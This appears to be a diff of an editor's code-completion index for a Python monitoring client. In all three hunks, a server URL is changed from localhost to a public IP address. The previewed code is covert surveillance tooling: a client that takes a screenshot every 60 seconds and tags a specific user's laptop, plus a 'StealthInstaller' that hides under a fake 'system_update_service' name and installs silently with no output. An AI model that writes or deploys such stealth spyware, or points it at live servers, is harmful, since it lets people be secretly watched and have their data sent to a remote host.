@@ -314,7 +314,7 @@
         "kind": 6,
         "importPath": "client.src.core.config",
         "description": "client.src.core.config",
-        "peekOfCode": "class Config:\n    # Server Configuration\n    SERVER_URL = \"http://127.0.0.1:8000\"\n    API_ENDPOINT = f\"{SERVER_URL}/api\"\n    # Client Identification\n    CLIENT_ID = \"5fd85b0a-def8-432c-b10a-0a28c22f5baf\"  # From database registration\n    CLIENT_NAME = \"Yayasans-MacBook-Air.local\"\n    CLIENT_USER = \"yapi\"\n    # Monitoring Settings\n    SCREENSHOT_INTERVAL = 60  # seconds",
+        "peekOfCode": "class Config:\n    # Server Configuration\n    SERVER_URL = \"http://103.129.149.67\"\n    API_ENDPOINT = f\"{SERVER_URL}/api\"\n    # Client Identification\n    CLIENT_ID = \"5fd85b0a-def8-432c-b10a-0a28c22f5baf\"  # From database registration\n    CLIENT_NAME = \"Yayasans-MacBook-Air.local\"\n    CLIENT_USER = \"yapi\"\n    # Monitoring Settings\n    SCREENSHOT_INTERVAL = 60  # seconds",
         "detail": "client.src.core.config",
         "documentation": {}
     },
@@ -431,7 +431,7 @@
         "kind": 6,
         "importPath": "client.stealth_install",
         "description": "client.stealth_install",
-        "peekOfCode": "class StealthInstaller:\n    def __init__(self, server_url=\"http://127.0.0.1:8000\"):\n        self.system = platform.system().lower()\n        self.server_url = server_url\n        self.install_dir = self._get_install_dir()\n        self.service_name = \"system_update_service\"\n    def _get_install_dir(self):\n        \"\"\"Get appropriate installation directory based on OS\"\"\"\n        if self.system == \"windows\":\n            return os.path.join(os.environ.get('APPDATA', ''), 'SystemUpdate')",
+        "peekOfCode": "class StealthInstaller:\n    def __init__(self, server_url=\"http://103.129.149.67\"):\n        self.system = platform.system().lower()\n        self.server_url = server_url\n        self.install_dir = self._get_install_dir()\n        self.service_name = \"system_update_service\"\n    def _get_install_dir(self):\n        \"\"\"Get appropriate installation directory based on OS\"\"\"\n        if self.system == \"windows\":\n            return os.path.join(os.environ.get('APPDATA', ''), 'SystemUpdate')",
         "detail": "client.stealth_install",
         "documentation": {}
     },
@@ -440,7 +440,7 @@
         "kind": 2,
         "importPath": "client.stealth_install",
         "description": "client.stealth_install",
-        "peekOfCode": "def main():\n    \"\"\"Main installation function\"\"\"\n    # Get server URL from command line or use default\n    server_url = sys.argv[1] if len(sys.argv) > 1 else \"http://127.0.0.1:8000\"\n    installer = StealthInstaller(server_url)\n    success = installer.silent_install()\n    # No output - completely silent\n    sys.exit(0 if success else 1)\nif __name__ == \"__main__\":\n    main()",
+        "peekOfCode": "def main():\n    \"\"\"Main installation function\"\"\"\n    # Get server URL from command line or use default\n    server_url = sys.argv[1] if len(sys.argv) > 1 else \"http://103.129.149.67\"\n    installer = StealthInstaller(server_url)\n    success = installer.silent_install()\n    # No output - completely silent\n    sys.exit(0 if success else 1)\nif __name__ == \"__main__\":\n    main()",
         "detail": "client.stealth_install",
         "documentation": {}
     },
